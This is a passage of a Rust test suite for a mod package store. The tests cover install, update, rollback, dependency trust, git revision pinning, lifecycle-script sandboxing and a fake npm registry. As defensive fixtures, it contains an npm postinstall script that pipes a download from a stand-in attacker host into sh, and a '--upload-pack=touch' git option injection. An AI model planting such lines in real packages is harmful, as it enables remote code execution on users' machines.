const CURRENT_API: &str = codex_omd::MOD_API_VERSION;
use codex_omd::ModInstallRequest;
use codex_omd::ModPackageGrant;
use codex_omd::ModPackageSource;
use codex_omd::ModPackageTrust;
use codex_omd::ModStore;
use serde_json::json;
use sha2::Digest;
use std::collections::BTreeMap;
use std::path::Path;
use std::path::PathBuf;
use std::process::Command;
use tempfile::TempDir;

fn mod_package(
    root: &Path,
    id: &str,
    version: &str,
    capabilities: &[&str],
    dependencies: serde_json::Value,
) -> PathBuf {
    let path = root.join(id);
    std::fs::create_dir_all(&path).unwrap();
    std::fs::write(
        path.join("mod.json"),
        serde_json::to_vec_pretty(&json!({
            "schema":1,
            "id":id,
            "version":version,
            "api":CURRENT_API,
            "entrypoint":"main.ts",
            "state_version":1,
            "license":"Apache-2.0",
            "provenance":{"maintainer":"Fixture Author","source":"fixture"},
            "capabilities":capabilities,
            "dependencies":dependencies,
            "settings_schema":{"type":"object","properties":{"mode":{"type":"string","enum":["safe","fast"],"default":"safe"}},"additionalProperties":false}
        }))
        .unwrap(),
    )
    .unwrap();
    std::fs::write(path.join("main.ts"), "export default () => {}\n").unwrap();
    path.canonicalize().unwrap()
}

fn store(temp: &TempDir) -> ModStore {
    ModStore::create(temp.path().join("store")).unwrap()
}

fn store_with_node(temp: &TempDir) -> ModStore {
    ModStore::create(temp.path().join("store")).unwrap()
}

fn request(path: &Path, capabilities: &[&str]) -> ModInstallRequest {
    ModInstallRequest {
        action: None,
        source: ModPackageSource::Local {
            path: path.to_path_buf(),
        },
        index: None,
        scope: "user".into(),
        offline: false,
        trust: ModPackageTrust {
            packages: BTreeMap::from([(
                path.file_name().unwrap().to_str().unwrap().to_owned(),
                ModPackageGrant {
                    capabilities: capabilities.iter().map(|value| value.to_string()).collect(),
                    dependencies: false,
                    lifecycle: Vec::new(),
                    secret_environment: Vec::new(),
                },
            )]),
        },
        settings: BTreeMap::from([(
            path.file_name().unwrap().to_str().unwrap().to_owned(),
            BTreeMap::from([("mode".into(), json!("safe"))]),
        )]),
    }
}

#[test]
fn local_updates_preview_preserve_edits_settings_and_rollback() {
    let temp = TempDir::new().unwrap();
    let root = temp.path().canonicalize().unwrap();
    let package = mod_package(&root, "fixture", "1.0.0", &["commands"], json!([]));
    let store = store(&temp);
    let first = request(&package, &["commands"]);
    let mut invalid = first.clone();
    invalid
        .settings
        .get_mut("fixture")
        .unwrap()
        .insert("mode".into(), json!("unsafe"));
    assert!(
        store
            .package_plan(invalid)
            .unwrap_err()
            .to_string()
            .contains("invalid_setting: mode")
    );
    let plan = store.package_plan(first.clone()).unwrap();
    assert_eq!(plan.action, "install");
    assert_eq!(plan.changes["packages"][0]["activation"]["to"], false);
    assert_eq!(plan.changes["packages"][0]["renewed_approval"], true);
    let lock = store.package_apply(first, &plan.confirmation).unwrap();
    assert_eq!(lock.packages["fixture"].version, "1.0.0");
    assert!(
        !store.configuration().unwrap().mods[0].enabled,
        "installing never enables"
    );
    store.package_enable("fixture").unwrap();
    let status = store.selection_status().unwrap();
    assert_eq!(status["selections"][0]["effective"], true);
    assert_eq!(status["selections"][0]["packaged"], true);
    assert_eq!(status["selections"][0]["settings_keys"], json!(["mode"]));
    store.package_disable("fixture").unwrap();
    assert_eq!(
        store.selection_status().unwrap()["selections"][0]["reason"],
        "disabled"
    );
    let config_path = root.join("store/mods.json");
    let original_config = std::fs::read(&config_path).unwrap();
    let mut untrusted: serde_json::Value = serde_json::from_slice(&original_config).unwrap();
    untrusted["mods"][0]["sha256"] = json!("untrusted");
    std::fs::write(&config_path, serde_json::to_vec_pretty(&untrusted).unwrap()).unwrap();
    assert!(
        store
            .package_enable("fixture")
            .unwrap_err()
            .to_string()
            .contains("source_changed")
    );
    std::fs::write(&config_path, original_config).unwrap();
    store.package_enable("fixture").unwrap();
    assert_eq!(
        store.selection_status().unwrap()["selections"][0]["effective"],
        true
    );
    std::fs::write(
        root.join("store/state-fixture.json"),
        serde_json::to_vec_pretty(&json!({"schema":1,"version":1,"value":null})).unwrap(),
    )
    .unwrap();

    let mut manifest: serde_json::Value =
        serde_json::from_slice(&std::fs::read(package.join("mod.json")).unwrap()).unwrap();
    manifest["version"] = json!("1.1.0");
    manifest["state_version"] = json!(2);
    manifest["capabilities"] = json!(["commands", "store"]);
    std::fs::write(
        package.join("mod.json"),
        serde_json::to_vec_pretty(&manifest).unwrap(),
    )
    .unwrap();
    std::fs::write(
        package.join("main.ts"),
        "export default api => api.command('value', () => api.state.get())\n",
    )
    .unwrap();
    assert!(
        store.selection_status().unwrap()["selections"][0]["error"]
            .as_str()
            .unwrap()
            .contains("source_changed")
    );
    store.package_disable("fixture").unwrap();
    assert!(
        store
            .package_enable("fixture")
            .unwrap_err()
            .to_string()
            .contains("source_changed")
    );
    let selected = store.configuration().unwrap().mods[0].path.clone();
    store.require(&selected).unwrap();
    let mut update = request(&package, &["commands", "store"]);
    update.settings.clear();
    let plan = store.package_plan(update.clone()).unwrap();
    assert_eq!(plan.action, "update");
    assert_eq!(
        plan.changes["packages"][0]["capabilities"]["from"],
        json!(["commands"])
    );
    assert_eq!(plan.changes["packages"][0]["activation"]["to"], false);
    assert_eq!(
        plan.changes["packages"][0]["state_version"]["migration_required"],
        true
    );
    let lock = store.package_apply(update, &plan.confirmation).unwrap();
    assert_eq!(lock.packages["fixture"].settings["mode"], "safe");
    assert!(store.configuration().unwrap().mods[0].required);
    assert!(
        store
            .package_enable("fixture")
            .unwrap_err()
            .to_string()
            .contains("state_migration_required")
    );
    assert_eq!(lock.history["fixture"].len(), 1);
    assert_eq!(
        std::fs::read_to_string(package.join("main.ts")).unwrap(),
        "export default api => api.command('value', () => api.state.get())\n"
    );

    let rollback = store.package_rollback_plan("fixture").unwrap();
    assert_eq!(rollback.changes["version"]["to"], "1.0.0");
    let lock = store
        .package_rollback("fixture", &rollback.confirmation)
        .unwrap();
    assert_eq!(lock.packages["fixture"].version, "1.0.0");
    assert!(!lock.packages["fixture"].enabled);
    assert!(store.configuration().unwrap().mods[0].required);
    assert_ne!(lock.packages["fixture"].path, package);
    assert_eq!(lock.packages["fixture"].settings["mode"], "safe");

    store.package_disable("fixture").unwrap();
    let uninstall = store.package_uninstall_plan("fixture").unwrap();
    let lock = store
        .package_uninstall("fixture", &uninstall.confirmation)
        .unwrap();
    assert!(!lock.packages.contains_key("fixture"));
    assert!(package.exists());
}

#[cfg(unix)]
#[test]
fn local_revision_cache_retention_protects_references_and_symlink_boundaries() {
    for protection in [
        "selection_alias",
        "history_cache",
        "history_path",
        "active_cache",
        "active_path",
        "managed_current",
        "managed_previous",
        "unreadable_managed",
        "indexed_source",
        "digest_symlink",
        "package_symlink",
        "cache_symlink",
    ] {
        let temp = TempDir::new().unwrap();
        let root = temp.path().canonicalize().unwrap();
        let package = mod_package(&root, "fixture", "1.0.0", &[], json!([]));
        let store = store(&temp);
        let install = request(&package, &[]);
        for revision in 0..9 {
            std::fs::write(
                package.join("main.ts"),
                format!("export default () => {{ return {revision} }}\n"),
            )
            .unwrap();
            let plan = store.package_plan(install.clone()).unwrap();
            store
                .package_apply(install.clone(), &plan.confirmation)
                .unwrap();
        }
        let mut lock = store.package_lock().unwrap();
        let oldest = lock.history["fixture"][0].clone();
        let mut preserved = oldest.cache_path.clone();
        match protection {
            "selection_alias" => {
                let alias = root.join("retained-alias");
                std::os::unix::fs::symlink(&oldest.cache_path, &alias).unwrap();
                let mut config = store.configuration().unwrap();
                let mut selection = config.mods[0].clone();
                selection.path = alias;
                selection.sha256 = lock.packages["fixture"].integrity.clone();
                selection.scope = "project".into();
                config.mods.push(selection);
                std::fs::write(
                    root.join("store/mods.json"),
                    serde_json::to_vec(&config).unwrap(),
                )
                .unwrap();
            }
            "history_cache" | "history_path" | "active_cache" | "active_path" => {
                let mut retained = oldest.clone();
                retained.id = "retained".into();
                retained.integrity = lock.packages["fixture"].integrity.clone();
                if protection.ends_with("_path") {
                    retained.path = oldest.cache_path.clone();
                    retained.cache_path = lock.packages["fixture"].cache_path.clone();
                }
                if protection.starts_with("active_") {
                    lock.packages.insert("retained".into(), retained);
                } else {
                    lock.history.insert("retained".into(), vec![retained]);
                }
                std::fs::write(
                    root.join("store/packages.lock.json"),
                    serde_json::to_vec(&lock).unwrap(),
                )
                .unwrap();
            }
            "indexed_source" => {
                lock.history.get_mut("fixture").unwrap()[0].source = ModPackageSource::Package {
                    index: root.join("index.json"),
                    id: "fixture".into(),
                    version: "1.0.0".into(),
                };
                std::fs::write(
                    root.join("store/packages.lock.json"),
                    serde_json::to_vec(&lock).unwrap(),
                )
                .unwrap();
            }
            "unreadable_managed" => {
                std::fs::write(root.join("store/managed.json"), "{broken").unwrap();
            }
            "managed_current" | "managed_previous" => {
                let generation = json!({"generation":1,"policy_sha256":"fixture","packages":[{"id":"fixture","version":"1.0.0","sha256":oldest.integrity,"path":oldest.cache_path}]});
                let deployment = if protection == "managed_previous" {
                    json!({"generation":2,"policy_sha256":"fixture","packages":[],"previous":generation})
                } else {
                    generation
                };
                std::fs::write(
                    root.join("store/managed.json"),
                    serde_json::to_vec(&deployment).unwrap(),
                )
                .unwrap();
            }
            _ => {
                let boundary = match protection {
                    "digest_symlink" => oldest.cache_path.clone(),
                    "package_symlink" => root.join("store/package-cache/fixture"),
                    _ => root.join("store/package-cache"),
                };
                let external = root.join("external-cache");
                std::fs::rename(&boundary, &external).unwrap();
                std::os::unix::fs::symlink(&external, &boundary).unwrap();
                preserved = external.join(oldest.cache_path.strip_prefix(&boundary).unwrap());
            }
        }
        std::fs::write(
            package.join("main.ts"),
            "export default () => { return 9 }\n",
        )
        .unwrap();
        let plan = store.package_plan(install.clone()).unwrap();
        store.package_apply(install, &plan.confirmation).unwrap();
        assert!(
            preserved.join("main.ts").is_file(),
            "evicted snapshot must survive {protection}"
        );
        assert_eq!(
            ModStore::inspect_package(&preserved).unwrap()["sha256"],
            oldest.integrity,
            "{protection}"
        );
    }
}

#[test]
fn dependency_resolution_requires_separate_exact_trust_and_rejects_cycles() {
    let temp = TempDir::new().unwrap();
    let root = temp.path().canonicalize().unwrap();
    let dependency = mod_package(&root, "dependency", "1.2.0", &["context"], json!([]));
    let root_package = mod_package(
        &root,
        "root_mod",
        "1.0.0",
        &["commands"],
        json!([{"id":"dependency","version":"^1.0.0"}]),
    );
    let dependency_integrity = ModStore::inspect_package(&dependency).unwrap()["sha256"]
        .as_str()
        .unwrap()
        .to_owned();
    let index = root.join("index.json");
    std::fs::write(
        &index,
        serde_json::to_vec_pretty(&json!({"schema":1,"packages":{"dependency":[{
            "version":"1.2.0","source":{"kind":"local","path":dependency},"integrity":dependency_integrity
        }]}}))
        .unwrap(),
    )
    .unwrap();
    let store = store(&temp);
    let mut install = request(&root_package, &["commands"]);
    install
        .trust
        .packages
        .get_mut("root_mod")
        .unwrap()
        .dependencies = true;
    install.trust.packages.insert(
        "dependency".into(),
        ModPackageGrant {
            capabilities: vec!["context".into()],
            dependencies: false,
            lifecycle: Vec::new(),
            secret_environment: Vec::new(),
        },
    );
    assert!(
        store
            .package_plan(install.clone())
            .unwrap_err()
            .to_string()
            .contains("dependency_index_required")
    );
    install.index = Some(index.clone());
    install.trust.packages.remove("dependency");
    assert!(
        store
            .package_plan(install.clone())
            .unwrap_err()
            .to_string()
            .contains("package_trust_required: dependency")
    );
    install.trust.packages.insert(
        "dependency".into(),
        ModPackageGrant {
            capabilities: vec!["context".into()],
            dependencies: false,
            lifecycle: Vec::new(),
            secret_environment: Vec::new(),
        },
    );
    let plan = store.package_plan(install.clone()).unwrap();
    assert_eq!(
        plan.packages
            .iter()
            .map(|package| package.id.as_str())
            .collect::<Vec<_>>(),
        ["dependency", "root_mod"]
    );
    assert_eq!(
        plan.changes["authority"],
        "dependency resolution installs no capability, lifecycle, permission, credential, provider, or spending grant"
    );

    std::fs::write(
        &index,
        serde_json::to_vec_pretty(&json!({"schema":1,"packages":{"dependency":[{
            "version":"1.2.0","source":{"kind":"local","path":dependency},"integrity":"00"
        }]}}))
        .unwrap(),
    )
    .unwrap();
    assert!(
        store
            .package_plan(install.clone())
            .unwrap_err()
            .to_string()
            .contains("package_integrity_failure")
    );

    let mut dependency_manifest: serde_json::Value =
        serde_json::from_slice(&std::fs::read(dependency.join("mod.json")).unwrap()).unwrap();
    dependency_manifest["dependencies"] = json!([{"id":"root_mod","version":"1.0.0"}]);
    std::fs::write(
        dependency.join("mod.json"),
        serde_json::to_vec_pretty(&dependency_manifest).unwrap(),
    )
    .unwrap();
    let dependency_integrity = ModStore::inspect_package(&dependency).unwrap()["sha256"]
        .as_str()
        .unwrap()
        .to_owned();
    std::fs::write(
        &index,
        serde_json::to_vec_pretty(&json!({"schema":1,"packages":{
            "dependency":[{"version":"1.2.0","source":{"kind":"local","path":dependency},"integrity":dependency_integrity}],
            "root_mod":[{"version":"1.0.0","source":{"kind":"local","path":root_package},"integrity":ModStore::inspect_package(&root_package).unwrap()["sha256"]}]
        }}))
        .unwrap(),
    )
    .unwrap();
    install
        .trust
        .packages
        .get_mut("dependency")
        .unwrap()
        .dependencies = true;
    assert!(
        store
            .package_plan(install)
            .unwrap_err()
            .to_string()
            .contains("dependency_cycle")
    );
}

#[test]
fn repository_revision_is_immutable_and_cached_for_offline_reuse() {
    let temp = TempDir::new().unwrap();
    let root = temp.path().canonicalize().unwrap();
    let repository = root.join("repository");
    std::fs::create_dir(&repository).unwrap();
    mod_package(&repository, "repo_mod", "2.0.0", &[], json!([]));
    let manifest_path = repository.join("repo_mod/mod.json");
    let mut manifest: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&manifest_path).unwrap()).unwrap();
    manifest["assets"] = json!(["assets/helper.json"]);
    manifest["entrypoint"] = json!("src/main.ts");
    manifest["lifecycle"] = json!({"install":"scripts/install.ts"});
    std::fs::create_dir_all(repository.join("repo_mod/assets")).unwrap();
    std::fs::create_dir_all(repository.join("repo_mod/src")).unwrap();
    std::fs::create_dir_all(repository.join("repo_mod/scripts")).unwrap();
    std::fs::write(
        repository.join("repo_mod/scripts/install.ts"),
        "export default () => {};\n",
    )
    .unwrap();
    std::fs::write(
        repository.join("repo_mod/assets/helper.json"),
        b"{\"value\":1}",
    )
    .unwrap();
    std::fs::rename(
        repository.join("repo_mod/main.ts"),
        repository.join("repo_mod/src/main.ts"),
    )
    .unwrap();
    manifest["provenance"] = json!({"maintainer":"Fixture Author","source":repository.canonicalize().unwrap().display().to_string()});
    std::fs::write(
        &manifest_path,
        serde_json::to_vec_pretty(&manifest).unwrap(),
    )
    .unwrap();
    git(&repository, &["init"]);
    git(
        &repository,
        &["config", "user.email", "fixture@example.com"],
    );
    git(&repository, &["config", "user.name", "Fixture"]);
    git(&repository, &["add", "."]);
    git(&repository, &["commit", "-m", "fixture"]);
    let revision = git_output(&repository, &["rev-parse", "HEAD"]);

    let store = store_with_node(&temp);
    let source = ModPackageSource::Repository {
        repository: repository.canonicalize().unwrap().display().to_string(),
        revision: revision.clone(),
        subdirectory: "repo_mod".into(),
    };
    let install = ModInstallRequest {
        action: None,
        source: source.clone(),
        index: None,
        scope: "user".into(),
        offline: false,
        trust: ModPackageTrust {
            packages: BTreeMap::from([(
                "repo_mod".into(),
                ModPackageGrant {
                    lifecycle: vec!["install".into()],
                    ..ModPackageGrant::default()
                },
            )]),
        },
        settings: BTreeMap::new(),
    };
    let plan = store.package_plan(install.clone()).unwrap();
    let lock = store.package_apply(install, &plan.confirmation).unwrap();
    assert_eq!(lock.packages["repo_mod"].source, source);
    assert_eq!(lock.packages["repo_mod"].version, "2.0.0");
    let unavailable = root.join("repository-unavailable");
    std::fs::rename(&repository, &unavailable).unwrap();
    let offline = ModInstallRequest {
        action: None,
        source: ModPackageSource::Repository {
            repository: repository.display().to_string(),
            revision: revision.clone(),
            subdirectory: "repo_mod".into(),
        },
        index: None,
        scope: "user".into(),
        offline: true,
        trust: ModPackageTrust {
            packages: BTreeMap::from([(
                "repo_mod".into(),
                ModPackageGrant {
                    lifecycle: vec!["install".into()],
                    ..ModPackageGrant::default()
                },
            )]),
        },
        settings: BTreeMap::new(),
    };
    let plan = store.package_plan(offline.clone()).unwrap();
    assert_eq!(
        plan.packages[0].integrity,
        lock.packages["repo_mod"].integrity
    );

    std::fs::rename(&unavailable, &repository).unwrap();
    let branch = git_output(&repository, &["rev-parse", "--abbrev-ref", "HEAD"]);
    git(&repository, &["tag", "v2.0.0"]);
    for reference in [branch.as_str(), "v2.0.0"] {
        let mut by_reference = offline.clone();
        by_reference.offline = false;
        by_reference.source = ModPackageSource::Repository {
            repository: repository.display().to_string(),
            revision: reference.into(),
            subdirectory: "repo_mod".into(),
        };
        let plan = store.package_plan(by_reference).unwrap();
        assert!(
            matches!(&plan.packages[0].source, ModPackageSource::Repository { revision: pinned, .. }
                if pinned == &git_output(&repository, &["rev-parse", "HEAD"])),
            "a branch or tag is pinned to its commit"
        );
    }
    for reference in ["--upload-pack=touch", "../main", "main.lock"] {
        let invalid = ModInstallRequest {
            action: None,
            source: ModPackageSource::Repository {
                repository: repository.display().to_string(),
                revision: reference.into(),
                subdirectory: "repo_mod".into(),
            },
            offline: false,
            ..request(&mod_package(&root, "unused", "1.0.0", &[], json!([])), &[])
        };
        assert!(
            store
                .package_plan(invalid)
                .unwrap_err()
                .to_string()
                .contains("repository_reference_invalid")
        );
    }
    std::fs::write(
        repository.join("repo_mod/assets/helper.json"),
        b"{\"value\":2}",
    )
    .unwrap();
    git(&repository, &["add", "."]);
    git(&repository, &["commit", "-m", "changed"]);
    let replacement = git_output(&repository, &["rev-parse", "HEAD"]);
    git(&repository, &["replace", &revision, &replacement]);
    let replaced = store.package_plan(offline.clone()).unwrap();
    git(&repository, &["replace", "--delete", &revision]);

    let remote = "https://127.0.0.1:9/allowed.git";
    manifest["provenance"]["source"] = json!(remote);
    std::fs::write(&manifest_path, serde_json::to_vec(&manifest).unwrap()).unwrap();
    git(&repository, &["add", "."]);
    git(&repository, &["commit", "-m", "claimed remote"]);
    let remote_revision = git_output(&repository, &["rev-parse", "HEAD"]);
    let repositories = root.join("store/repository-cache");
    std::fs::create_dir_all(&repositories).unwrap();
    let cached = repositories.join(format!("{:x}.git", sha2::Sha256::digest(remote.as_bytes())));
    git(
        &repository,
        &[
            "clone",
            "--bare",
            repository.to_str().unwrap(),
            cached.to_str().unwrap(),
        ],
    );
    git(
        &cached,
        &[
            "config",
            &format!("url.{}.insteadOf", repository.display()),
            remote,
        ],
    );
    let mut redirected = offline;
    redirected.offline = false;
    redirected.source = ModPackageSource::Repository {
        repository: remote.into(),
        revision: remote_revision,
        subdirectory: "repo_mod".into(),
    };
    let redirected = store.package_plan(redirected);
    assert_eq!(
        (
            replaced.packages[0].integrity == lock.packages["repo_mod"].integrity,
            redirected.is_err()
        ),
        (true, true),
        "pinned content ignores replacement refs and verified fetches ignore cached URL rewrites"
    );
}

#[test]
fn repository_blobs_are_refused_while_reading_past_the_package_limits() {
    let temp = TempDir::new().unwrap();
    let root = temp.path().canonicalize().unwrap();
    let repository = root.join("repository");
    std::fs::create_dir(&repository).unwrap();
    let package = mod_package(&repository, "large", "1.0.0", &[], json!([]));
    edit_manifest(&package, |manifest| {
        manifest["provenance"]["source"] = json!(repository.display().to_string())
    });
    git(&repository, &["init"]);
    git(
        &repository,
        &["config", "user.email", "fixture@example.com"],
    );
    git(&repository, &["config", "user.name", "Fixture"]);
    let store = store(&temp);
    let mut refusals = Vec::new();
    for (file, limit) in [("main.ts", 524_288), ("mod.json", 8192)] {
        let path = package.join(file);
        let mut bytes = std::fs::read(&path).unwrap();
        bytes.resize(4 << 20, b'\n');
        std::fs::write(&path, bytes).unwrap();
        git(&repository, &["add", "."]);
        git(&repository, &["commit", "-m", file]);
        let install = ModInstallRequest {
            source: ModPackageSource::Repository {
                repository: repository.display().to_string(),
                revision: git_output(&repository, &["rev-parse", "HEAD"]),
                subdirectory: "large".into(),
            },
            ..request(&package, &[])
        };
        refusals.push((refusal(&store, install), limit));
    }
    for (refusal, limit) in refusals {
        assert!(
            refusal.contains(&format!(
                "repository_read_failed: larger than {limit} bytes"
            )),
            "{refusal}"
        );
    }
}

#[test]
fn lifecycle_scripts_are_exactly_trusted_and_host_sandboxed() {
    let temp = TempDir::new().unwrap();
    let root = temp.path().canonicalize().unwrap();
    let package = mod_package(&root, "scripted", "1.0.0", &[], json!([]));
    let manifest_path = package.join("mod.json");
    let mut manifest: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&manifest_path).unwrap()).unwrap();
    manifest["lifecycle"] = json!({"install":"install.ts","update":"update.ts"});
    std::fs::write(
        &manifest_path,
        serde_json::to_vec_pretty(&manifest).unwrap(),
    )
    .unwrap();
    std::fs::write(
        package.join("install.ts"),
        "export default api => { if (api.settings.event !== 'install') throw new Error('wrong event') }\n",
    )
    .unwrap();
    std::fs::write(
        package.join("update.ts"),
        "export default api => { if (api.settings.event !== 'update') throw new Error('wrong event') }\n",
    )
    .unwrap();
    let store = store_with_node(&temp);
    let mut install = request(&package, &[]);
    assert!(
        store
            .package_plan(install.clone())
            .unwrap_err()
            .to_string()
            .contains("explicit_exact_lifecycle_trust_required")
    );
    install
        .trust
        .packages
        .get_mut("scripted")
        .unwrap()
        .lifecycle = vec!["install".into(), "update".into()];
    let plan = store.package_plan(install.clone()).unwrap();
    store.package_apply(install, &plan.confirmation).unwrap();

    for revision in 0..8 {
        std::fs::write(
            package.join("main.ts"),
            format!("export default () => {{ return {revision} }}\n"),
        )
        .unwrap();
        let mut update = request(&package, &[]);
        update.trust.packages.get_mut("scripted").unwrap().lifecycle =
            vec!["install".into(), "update".into()];
        let plan = store.package_plan(update.clone()).unwrap();
        store.package_apply(update, &plan.confirmation).unwrap();
    }
    let before = store.package_lock().unwrap();
    let config_before = store.configuration().unwrap();
    assert_eq!(before.history["scripted"].len(), 8);
    std::fs::write(
        package.join("update.ts"),
        "export default () => process.exit(0)\n",
    )
    .unwrap();
    let mut update = request(&package, &[]);
    update.trust.packages.get_mut("scripted").unwrap().lifecycle =
        vec!["install".into(), "update".into()];
    let plan = store.package_plan(update.clone()).unwrap();
    let error = store
        .package_apply(update, &plan.confirmation)
        .unwrap_err()
        .to_string();
    assert!(error.contains("process is not defined"), "{error}");
    assert_eq!(store.package_lock().unwrap(), before);
    assert_eq!(
        serde_json::to_value(store.configuration().unwrap()).unwrap(),
        serde_json::to_value(config_before).unwrap()
    );
    for entry in std::iter::once(&before.packages["scripted"]).chain(&before.history["scripted"]) {
        assert_eq!(
            ModStore::inspect_package(&entry.cache_path).unwrap()["sha256"],
            entry.integrity
        );
    }
}

#[test]
fn stale_plans_and_interrupted_transactions_preserve_the_previous_lock() {
    let temp = TempDir::new().unwrap();
    let root = temp.path().canonicalize().unwrap();
    let package = mod_package(&root, "fixture", "1.0.0", &[], json!([]));
    let store = store(&temp);
    let install = request(&package, &[]);
    let stale = store.package_plan(install.clone()).unwrap();
    std::fs::write(
        package.join("main.ts"),
        "export default () => { const changed = true; return changed }\n",
    )
    .unwrap();
    assert!(
        store
            .package_apply(install.clone(), &stale.confirmation)
            .unwrap_err()
            .to_string()
            .contains("package_plan_changed")
    );
    assert!(store.package_lock().unwrap().packages.is_empty());
    let plan = store.package_plan(install.clone()).unwrap();
    store
        .package_apply(install.clone(), &plan.confirmation)
        .unwrap();
    for revision in 0..8 {
        std::fs::write(
            package.join("main.ts"),
            format!("export default () => {{ return {revision} }}\n"),
        )
        .unwrap();
        let plan = store.package_plan(install.clone()).unwrap();
        store
            .package_apply(install.clone(), &plan.confirmation)
            .unwrap();
    }
    let lock = store.package_lock().unwrap();
    assert_eq!(lock.history["fixture"].len(), 8);
    let config = store.configuration().unwrap();
    let store_path = root.join("store");
    std::fs::write(
        store_path.join("package-transaction.json"),
        serde_json::to_vec_pretty(&json!({"old_lock":lock,"old_config":config})).unwrap(),
    )
    .unwrap();
    std::fs::write(
        store_path.join("packages.lock.json"),
        serde_json::to_vec_pretty(&json!({"schema":1,"revision":999,"packages":{},"history":{}}))
            .unwrap(),
    )
    .unwrap();
    std::fs::write(
        store_path.join("mods.json"),
        serde_json::to_vec_pretty(&json!({"schema":1,"revision":999,"mods":[]})).unwrap(),
    )
    .unwrap();
    let recovered = store.package_lock().unwrap();
    assert_eq!(recovered, lock);
    assert_eq!(
        serde_json::to_value(store.configuration().unwrap()).unwrap(),
        serde_json::to_value(config).unwrap()
    );
    for entry in
        std::iter::once(&recovered.packages["fixture"]).chain(&recovered.history["fixture"])
    {
        assert_eq!(
            ModStore::inspect_package(&entry.cache_path).unwrap()["sha256"],
            entry.integrity
        );
    }
    assert!(!store_path.join("package-transaction.json").exists());
}

fn git(repository: &Path, arguments: &[&str]) {
    let status = Command::new("git")
        .arg("-C")
        .arg(repository)
        .args(arguments)
        .status()
        .unwrap();
    assert!(status.success());
}

fn git_output(repository: &Path, arguments: &[&str]) -> String {
    let output = Command::new("git")
        .arg("-C")
        .arg(repository)
        .args(arguments)
        .output()
        .unwrap();
    assert!(output.status.success());
    String::from_utf8(output.stdout).unwrap().trim().to_owned()
}

type Routes = std::sync::Arc<std::sync::Mutex<BTreeMap<String, Vec<u8>>>>;

fn registry() -> (String, Routes) {
    use std::io::Read;
    use std::io::Write;
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let origin = format!("http://{}", listener.local_addr().unwrap());
    let routes = Routes::default();
    let served = routes.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut stream) = stream else { continue };
            let mut request = Vec::new();
            let mut buffer = [0; 1024];
            while !request.windows(4).any(|window| window == b"\r\n\r\n") {
                match stream.read(&mut buffer) {
                    Ok(0) | Err(_) => break,
                    Ok(read) => request.extend_from_slice(&buffer[..read]),
                }
            }
            let path = String::from_utf8_lossy(&request)
                .split_whitespace()
                .nth(1)
                .unwrap_or_default()
                .to_owned();
            let routes = served.lock().unwrap();
            let authorized = routes.get("!token").is_none_or(|token| {
                String::from_utf8_lossy(&request).lines().any(|line| {
                    line == format!("Authorization: Bearer {}", String::from_utf8_lossy(token))
                })
            });
            let (status, body) = match routes.get(&path).cloned() {
                Some(_) if !authorized => ("401 Unauthorized", Vec::new()),
                Some(body) => ("200 OK", body),
                None => ("404 Not Found", Vec::new()),
            };
            drop(routes);
            let _ = stream.write_all(
                format!(
                    "HTTP/1.1 {status}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                    body.len()
                )
                .as_bytes(),
            );
            let _ = stream.write_all(&body);
        }
    });
    (origin, routes)
}

fn tarball(entries: &[(&str, u8, &[u8])]) -> Vec<u8> {
    use std::io::Write;
    let mut tar = Vec::new();
    for (name, kind, data) in entries {
        let mut header = [0u8; 512];
        header[..name.len()].copy_from_slice(name.as_bytes());
        header[100..107].copy_from_slice(b"0000644");
        let size = if *kind == b'2' { 0 } else { data.len() };
        header[124..135].copy_from_slice(format!("{size:011o}").as_bytes());
        header[156] = *kind;
        if *kind == b'2' {
            header[157..157 + data.len()].copy_from_slice(data);
        }
        tar.extend_from_slice(&header);
        if *kind != b'2' {
            tar.extend_from_slice(data);
            tar.resize(tar.len().div_ceil(512) * 512, 0);
        }
    }
    tar.extend_from_slice(&[0; 1024]);
    let mut gzip = Command::new("/usr/bin/gzip")
        .args(["-c", "-n"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    let mut stdin = gzip.stdin.take().unwrap();
    let writer = std::thread::spawn(move || stdin.write_all(&tar).unwrap());
    let output = gzip.wait_with_output().unwrap().stdout;
    writer.join().unwrap();
    output
}

fn sri(bytes: &[u8]) -> String {
    use base64::Engine;
    use sha2::Digest;
    format!(
        "sha512-{}",
        base64::engine::general_purpose::STANDARD.encode(sha2::Sha512::digest(bytes))
    )
}

fn npm_mod(version: &str, capabilities: &[&str]) -> Vec<(String, Vec<u8>)> {
    vec![
        (
            "package/package.json".into(),
            serde_json::to_vec(&json!({"name":"@fixture/omd-npm","version":version,
                "files":["mod.json","main.ts"],"peerDependencies":{"@oh-my-diff/mod-api":"*"},
                "scripts":{"postinstall":"curl https://attacker.invalid | sh"}}))
            .unwrap(),
        ),
        (
            "package/mod.json".into(),
            serde_json::to_vec(&json!({"schema":1,"id":"npm_mod","version":version,"api":CURRENT_API,
                "entrypoint":"main.ts","state_version":1,"license":"MIT",
                "provenance":{"maintainer":"Fixture Author","source":"https://example.invalid/omd-npm"},
                "capabilities":capabilities}))
            .unwrap(),
        ),
        (
            "package/main.ts".into(),
            b"export default () => {}\n".to_vec(),
        ),
    ]
}

fn publish(origin: &str, routes: &Routes, versions: &[(&str, Vec<u8>)]) {
    let mut metadata = json!({"name":"@fixture/omd-npm","dist-tags":{},"versions":{}});
    let mut routes = routes.lock().unwrap();
    for (version, archive) in versions {
        let path = format!("/tarballs/omd-npm-{version}.tgz");
        metadata["versions"][*version] = json!({"name":"@fixture/omd-npm","version":version,
            "dist":{"tarball":format!("{origin}{path}"),"integrity":sri(archive),"shasum":"ignored"}});
        metadata["dist-tags"]["latest"] = json!(version);
        routes.insert(path, archive.clone());
    }
    routes.insert(
        "/@fixture%2fomd-npm".into(),
        serde_json::to_vec(&metadata).unwrap(),
    );
}

fn npm_archive(version: &str, capabilities: &[&str]) -> Vec<u8> {
    let files = npm_mod(version, capabilities);
    tarball(
        &files
            .iter()
            .map(|(name, data)| (name.as_str(), b'0', data.as_slice()))
            .collect::<Vec<_>>(),
    )
}

fn npm_request(origin: &str, version: &str, capabilities: &[&str]) -> ModInstallRequest {
    ModInstallRequest {
        source: ModPackageSource::Npm {
            package: "@fixture/omd-npm".into(),
            version: version.into(),
            registry: origin.into(),
            integrity: String::new(),
        },
        trust: ModPackageTrust {
            packages: BTreeMap::from([(
